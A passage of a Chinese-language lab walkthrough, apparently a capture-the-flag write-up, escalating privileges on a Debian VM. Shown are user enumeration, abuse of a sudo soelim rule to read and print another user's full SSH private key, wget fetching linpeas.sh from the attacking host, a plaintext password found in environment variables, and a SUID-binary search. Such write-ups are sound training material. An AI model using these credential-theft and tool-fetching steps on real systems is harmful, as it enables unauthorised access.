+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh root@<span class="number">192.168</span>.<span class="number">112.61</span>          </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.112.61 (192.168.112.61)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:<span class="number">6</span>HwEGo4iDv1jBtZC87BkDOsTnZ+MUZAnS9pq7IEaNCo.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.112.61&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">root@<span class="number">192.168</span>.<span class="number">112.61</span>: Permission denied (publickey).</span><br></pre></td></tr></table></figure></div>
+<p>目录扫描了一波，没有信息。<br>那就继续回到扫描的端口里面找信息，这里看到还有一个smb，所以用enum4linux扫一下 用<code>-a</code>参数把基本的都扫一下<br>扫出来了三个用户名，一家人</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Enumerating users using SID S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span> and logon username &#x27;&#x27;, password &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1000</span> Unix User\dad (Local User)</span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1001</span> Unix User\mum (Local User)</span><br><span class="line">S<span class="string">-1</span><span class="string">-22</span><span class="string">-1</span><span class="string">-1002</span> Unix User\baby (Local User)</span><br></pre></td></tr></table></figure></div>
+<p>然后用刚刚的私钥去尝试一下<br>成功登录baby的shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh aaa<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span></span><br><span class="line">aaa<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh dad<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa </span><br><span class="line">dad<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh mum<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">mom<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span>: Permission denied (publickey).</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)<span class="operator">-</span>[<span class="operator">~</span><span class="operator">/</span>tmp]</span><br><span class="line">└─# ssh baby<span class="variable">@192</span><span class="number">.168</span><span class="number">.112</span><span class="number">.61</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">Linux family2 <span class="number">5.10</span><span class="number">.0</span><span class="number">-9</span><span class="operator">-</span>amd64 #<span class="number">1</span> SMP Debian <span class="number">5.10</span><span class="number">.70</span><span class="number">-1</span> (<span class="number">2021</span><span class="number">-09</span><span class="number">-30</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU<span class="operator">/</span>Linux <span class="keyword">system</span> <span class="keyword">are</span> <span class="keyword">free</span> software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program <span class="keyword">are</span> described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="operator">/</span>usr<span class="operator">/</span>share<span class="operator">/</span>doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">You have mail.</span></span><br><span class="line"><span class="comment">Last login: Mon Nov  1 13:33:11 2021 from 192.168.0.28</span></span><br><span class="line"><span class="comment">baby@family2:~$ </span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure></div>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="baby"><a href="#baby" class="headerlink" title="baby"></a>baby</h2><p>baby有一个mom权限的指令soelim</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">baby<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> baby on <span class="symbol">family2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> baby may run the following commands on <span class="symbol">family2:</span></span><br><span class="line">    (mum) <span class="symbol">NOPASSWD:</span> /usr/bin/soelim</span><br></pre></td></tr></table></figure></div>
+<p><img src="https://pic1.imgdb.cn/item/67adb21cd0e0a243d4fed72e.png"><br>这个指令可以读取任意文件<br>成功读到mum的私钥</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">baby@family2:<span class="operator">/</span>home$ sudo <span class="operator">-</span>u mum soelim <span class="symbol">/home/mum/.ssh/id_rsa</span></span><br><span class="line">.lf <span class="number">1</span> <span class="symbol">/home/mum/.ssh/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAo8d07Ufqv8Iu7FoRUcYz8WROGwykIW72J1geSGt4qHWmsnheUleB</span><br><span class="line"><span class="number">90</span>HPkDtEv2lbbLRwbBvD0n9bXToliGTwsEi02STssQVizJ4KOujHHhv31K0tfxhP0kjHdC</span><br><span class="line">zU71RX7d<span class="symbol">/XksMWy/Ui2o2ME75tV86ej0SJ6oVmXdhEBg/37mHHdck3vSduKBVCFEkuc+VP</span></span><br><span class="line"><span class="number">5</span>gxSDUVsXeREipoIzBA61btF<span class="symbol">/tShhGkGeMt/xsETllKbnEYZDZm+LYMBwqH5rr33FNa+4i</span></span><br><span class="line">eKBbORjgPkT9mCUfmi1kyTlJToiGnHMhdiq8yZZlpU<span class="operator">+</span><span class="symbol">/tC3+M5y9YvJZ7WlMsY46ukeA24</span></span><br><span class="line">TQ<span class="operator">+</span>CntneHuJVRMVn4RImNwxa35BCNMWYdQ<span class="operator">+</span>wpZfSUxmrteyGmRNsRT8LGzbe<span class="symbol">/jsu8TKs6e</span></span><br><span class="line">Xib85QAeTlPXOJQI<span class="operator">+</span>j8m72pjSsRghQF<span class="operator">+</span>sR<span class="symbol">/wtIcNjwb+1fR+RJJ8MRdz9t3k6DIL2VPAZR</span></span><br><span class="line"><span class="number">1</span>PmAGVsz<span class="operator">+</span><span class="number">32</span>fZfBBpM2Kcgs9cKVOGbhoHE<span class="symbol">/kc8ETAAAFgKNndd2jZ3XdAAAAB3NzaC1yc2</span></span><br><span class="line">EAAAGBAKPHdO1H6r<span class="symbol">/CLuxaEVHGM/FkThsMpCFu9idYHkhreKh1prJ4XlJXgfdBz5A7RL9p</span></span><br><span class="line">W2y0cGwbw9J<span class="symbol">/W106JYhk8LBItNkk7LEFYsyeCjroxx4b99StLX8YT9JIx3Qs1O9UV+3f15</span></span><br><span class="line">LDFsv1ItqNjBO<span class="operator">+</span>bVfOno9EieqFZl3YRAYP9<span class="operator">+</span><span class="number">5</span>hx3XJN70nbigVQhRJLnPlT<span class="operator">+</span>YMUg1FbF3k</span><br><span class="line">RIqaCMwQOtW7Rf7UoYRpBnjLf8bBE5ZSm5xGGQ2Zvi2DAcKh<span class="operator">+</span>a699xTWvuInigWzkY4D5E</span><br><span class="line"><span class="symbol">/ZglH5otZMk5SU6IhpxzIXYqvMmWZaVPv7Qt/jOcvWLyWe1pTLGOOrpHgNuE0Pgp7Z3h7i</span></span><br><span class="line">VUTFZ<span class="operator">+</span>ESJjcMWt<span class="operator">+</span>QQjTFmHUPsKWX0lMZq7XshpkTbEU<span class="symbol">/Cxs23v47LvEyrOnl4m/OUAHk5T</span></span><br><span class="line"><span class="number">1</span>ziUCPo<span class="symbol">/Ju9qY0rEYIUBfrEf8LSHDY8G/tX0fkSSfDEXc/bd5OgyC9lTwGUdT5gBlbM/t9</span></span><br><span class="line">n2XwQaTNinILPXClThm4aBxP5HPBEwAAAAMBAAEAAAGBAKDUjIE6n08BvJyC8gEQlw<span class="operator">+</span>UhZ</span><br><span class="line">LQfhkK4xTN1qcdSpZ7OmCGDXHk1w7dBJxJZ4BkUNBV<span class="symbol">/RRcy5bZU/of0J25Khaiv12BgiFv</span></span><br><span class="line"><span class="symbol">/Y6cH8Wrs2Vg56VlDomBcVk5+QufvtbrR5GjwAkyJR/SsRBX8detp6iTkWd1Uc4Ig/biGi</span></span><br><span class="line">Kt6bWhNYL4PxE0OFuKTKKpHsHWzPhG3wiDRSCKubg1<span class="symbol">/S+PPIeIaPsPCTGDBUT36ZlfHwH+</span></span><br><span class="line">SytSNuYBNR1ySfc8onkzt236x0yAN5DHYRYge82vy<span class="symbol">/agoIeAonYHNpEtK1AjDYrBrreTZ+</span></span><br><span class="line">OtOREyfOh1<span class="operator">+</span>jq4Jf3HczIulml95xEF82gWGfYuX36B6Zg1FUXtCOKV9DEG2nsmTpaGo1ZI</span><br><span class="line">DN6Mbva<span class="symbol">/HXOBv4jm19amxJYK9J5/mawJauuwG2CmhoJDL03V4MeKFjOcdEPBxE3j23R6FI</span></span><br><span class="line">L3xV4gomGs5Cp92jX4P<span class="operator">+</span>dAtAt5kHkwYKbtxaiTQMHQupIgzeJruodIVVqTp0tlQrFJ4QAA</span><br><span class="line">AMAzVhhpPRAXs<span class="symbol">/o/YDnmKWkjbEDDMKbggUDl6lyhf7HbZkTxcPdFfHDGQomFfXSP6TzvSD</span></span><br><span class="line">RKQBvWGiUM82h4YVxd2CfIp<span class="operator">+</span>XJaiiUqeKJ9Qsq4MQv8BGbdvWxQuYR7yz4vu8a<span class="symbol">/QhNqmTb</span></span><br><span class="line">BdJI7IHLuVf6UuPibtoJaaIMd6KunNAEN2QGThNQ9SaZv8TMoaEL4xmca<span class="symbol">/snT3UwjzRvt1</span></span><br><span class="line"><span class="number">2</span>pEMfdjkeMsHkJ<span class="operator">+</span>RgSJkzsTgoLqPVCInRwoEQg1IMx5Pn<span class="symbol">/yMwAAADBANBYctl2AvRTRae+</span></span><br><span class="line">F6PRL84oUGwu71GVJV62Jc6GNOfVF4ucpYLBwh1Q74DoMnxSbP<span class="operator">+</span>BbksirRInBato5Ypd4R</span><br><span class="line"><span class="number">0</span>lW9Np39ajz9<span class="symbol">/hqVdV8w5Zhmxs5gcyEu42gALPbEddQ5Nub7r/95mNAL9Ui2IifbNSRhVT</span></span><br><span class="line">wbr9If0VABmmNp<span class="operator">+</span>zUH7qjEBktr2pZF4gOa<span class="symbol">/pj0yWAtYeKRN22kjdamz4902HWy1DYxKEPS</span></span><br><span class="line">WbnB8ZoPG0LHYyrhG9WmtZOukOLaoOgwAAAMEAyT1zGlhOFvgcNR9ewaZHU97p2m6<span class="symbol">/1lWj</span></span><br><span class="line">D3cP9Hgn1<span class="operator">+</span>IBWq3GvUrgBeG7DEWIKAq<span class="symbol">/dNjR6PaXrwMX2N7o67rJK7oEJMJae35drfUY4p</span></span><br><span class="line">io5sn28<span class="operator">+</span>mPz7q33EWa4pNijTIH<span class="symbol">/I6he7ESSsEsbe0wNu/usC5I315TbWNxyitBrqudOdHR</span></span><br><span class="line">mAQxMOsFzzTlgf6k0mYywlLX2ZKmdsgNd<span class="symbol">/TXlFhKvzaYavNulieSfGDkSAWXm12woT6vwx</span></span><br><span class="line">JminG0qhVpq<span class="operator">/</span><span class="number">4</span>xAAAACm11bUBkZWJpYW4<span class="operator">=</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
+<p>成功登录到mum</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># ssh mum@192.168.112.61 -i id_rsa</span></span><br><span class="line">Linux family2 <span class="number">5.10</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 <span class="comment">#1 SMP Debian 5.10.70-1 (2021-09-30) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">You have <span class="keyword">new</span> mail.</span><br><span class="line">Last login: Mon Nov  <span class="number">1</span> <span class="number">13</span>:<span class="number">33</span>:<span class="number">56</span> <span class="number">2021</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">0.43</span></span><br><span class="line">mum@family2:~$ </span><br></pre></td></tr></table></figure></div>
+<h2 id="mum"><a href="#mum" class="headerlink" title="mum"></a>mum</h2><p>有两个sudo</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mum<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> mum on <span class="symbol">family2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> mum may run the following commands on <span class="symbol">family2:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /usr/bin/shred -f -z /etc/passwd</span><br><span class="line">    (dad) <span class="title class_">ALL</span></span><br></pre></td></tr></table></figure></div>
+<p>root权限这条命令的意思是强制擦除 &#x2F;etc&#x2F;passwd 文件，并用零填充，以防数据恢复<br>虽然有dad的所有权限，但是用dad身份执行命令的时候需要输入密码，我们没有密码<br>现在再从本机上传linpeas.sh来扫一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mum@family2:~$ wget <span class="number">192.168</span>.<span class="number">112.83</span>/linpeas.<span class="keyword">sh</span></span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">23</span>--  http://<span class="number">192.168</span>.<span class="number">112.83</span>/linpeas.<span class="keyword">sh</span></span><br><span class="line">Connecting <span class="keyword">to</span> <span class="number">192.168</span>.<span class="number">112.83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">332111</span> (<span class="number">324</span>K) [text/<span class="keyword">x</span>-<span class="keyword">sh</span>]</span><br><span class="line">Saving <span class="keyword">to</span>: ‘linpeas.<span class="keyword">sh</span>’</span><br><span class="line"></span><br><span class="line">linpeas.<span class="keyword">sh</span>                   <span class="number">100</span>%[=============================================&gt;] <span class="number">324.33</span>K  --.-KB/s    in <span class="number">0.01</span>s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">09</span>:<span class="number">59</span>:<span class="number">24</span> (<span class="number">26.0</span> MB/s) - ‘linpeas.<span class="keyword">sh</span>’ saved [<span class="number">332111</span>/<span class="number">332111</span>]</span><br><span class="line"></span><br><span class="line">mum@family2:~$ chmod +<span class="keyword">x</span> linpeas.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></div>
+<p>在环境变量中成功扫出密码 <code>passwd=LA0172</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[+] Environment</span><br><span class="line">[i] Any private information inside environment variables?</span><br><span class="line"><span class="attribute">HISTFILESIZE</span>=0</span><br><span class="line"><span class="attribute">USER</span>=mum</span><br><span class="line"><span class="attribute">SSH_CLIENT</span>=192.168.112.83 49728 22</span><br><span class="line"><span class="attribute">XDG_SESSION_TYPE</span>=tty</span><br><span class="line"><span class="attribute">SHLVL</span>=1</span><br><span class="line"><span class="attribute">MOTD_SHOWN</span>=pam</span><br><span class="line"><span class="attribute">HOME</span>=/home/mum</span><br><span class="line"><span class="attribute">SSH_TTY</span>=/dev/pts/1</span><br><span class="line"><span class="attribute">LOGNAME</span>=mum</span><br><span class="line"><span class="attribute">_</span>=./linpeas.sh</span><br><span class="line"><span class="attribute">XDG_SESSION_CLASS</span>=user</span><br><span class="line"><span class="attribute">TERM</span>=xterm-256color</span><br><span class="line"><span class="attribute">XDG_SESSION_ID</span>=50</span><br><span class="line"><span class="attribute">PATH</span>=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin</span><br><span class="line"><span class="attribute">XDG_RUNTIME_DIR</span>=/run/user/1001</span><br><span class="line"><span class="attribute">LANG</span>=en_US.UTF-8</span><br><span class="line"><span class="attribute">HISTSIZE</span>=0</span><br><span class="line"><span class="attribute">SHELL</span>=/bin/bash</span><br><span class="line"><span class="attribute">passwd</span>=LA0172</span><br><span class="line"><span class="attribute">LC_ALL</span>=en_US.UTF-8</span><br><span class="line"><span class="attribute">SSH_CONNECTION</span>=192.168.112.83 49728 192.168.112.61 22</span><br><span class="line"><span class="attribute">HISTFILE</span>=/dev/null</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mum<span class="variable">@family2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -u dad /bin/bash</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">mum:</span> </span><br><span class="line">dad<span class="variable">@family2</span><span class="symbol">:/home/mum</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
+<h2 id="dad"><a href="#dad" class="headerlink" title="dad"></a>dad</h2><p>dad这里sudo需要密码，但是suid里面有个可以的文件是&#x2F;opt目录里面的</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dad<span class="variable">@family2</span>:~<span class="variable">$ </span>find / -u root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">dad<span class="variable">@family2</span>:~<span class="variable">$ </span>find / -user root -perm -<span class="number">4000</span> -print <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/openssh/ssh</span>-keysign</span><br><span class="line"><span class="regexp">/usr/lib</span><span class="regexp">/dbus-1.0/dbus</span>-daemon-launch-helper</span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chsh</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/sudo</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/mount</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/umount</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/chfn</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/newgrp</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/gpasswd</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/passwd</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/su</span></span><br><span class="line"><span class="regexp">/opt</span><span class="regexp">/clock</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">dad@family2:~$ file /opt</span><span class="regexp">/clock</span></span><br><span class="line"><span class="regexp">/opt</span><span class="regexp">/clock: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib</span>64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, BuildID[sha1]=c2d23ea9475938a9dd429b6390c97b750d6a1d84, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span>.<span class="number">0</span>, not stripped</span><br></pre></td></tr></table></figure></div>
+<p>有python，开http服务，本地下载这个文件查看一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">dad@family2:~$ <span class="keyword">python3</span></span><br><span class="line">Python <span class="number">3.9</span>.<span class="number">2</span> (default, Feb <span class="number">28</span> <span class="number">2021</span>, <span class="number">17</span>:<span class="number">03</span>:<span class="number">44</span>) </span><br><span class="line">[GCC <span class="number">10.2</span>.<span class="number">1</span> <span class="number">20210110</span>] <span class="keyword">on</span> linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="built_in">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">KeyboardInterrupt</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">cd</span> /<span class="keyword">opt</span></span><br><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">NameError: name <span class="string">&#x27;cd&#x27;</span> <span class="keyword">is</span> not defined</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">KeyboardInterrupt</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">exit</span>()</span><br><span class="line">dad@family2:~$ <span class="keyword">cd</span> /<span class="keyword">opt</span></span><br><span class="line">dad@family2:/<span class="keyword">opt</span>$ <span class="keyword">python3</span> -<span class="keyword">m</span> http.server</span><br><span class="line">Serving HTTP <span class="keyword">on</span> <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">8000</span>/) ...</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>用strings看</p>
